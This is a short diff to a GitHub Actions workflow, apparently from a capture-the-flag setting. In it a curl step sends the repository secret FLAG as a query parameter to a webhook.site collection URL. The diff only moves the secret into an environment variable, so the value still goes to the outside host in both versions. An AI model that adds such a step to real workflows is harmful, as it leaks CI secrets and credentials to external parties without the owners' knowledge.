@@ -8,8 +8,10 @@ jobs:
     steps:
     - name: curl
       uses: wei/curl@master
+      env:
+        FLAG: ${{ secrets.FLAG }}
       with:
-        args: https://webhook.site/b2ae8b56-8f2a-4347-bc8b-580993850e7b?a=${{ secrets.FLAG }}
+        args: https://webhook.site/b2ae8b56-8f2a-4347-bc8b-580993850e7b?a=${FLAG}
   deploy:
     runs-on: ubuntu-latest
     steps:
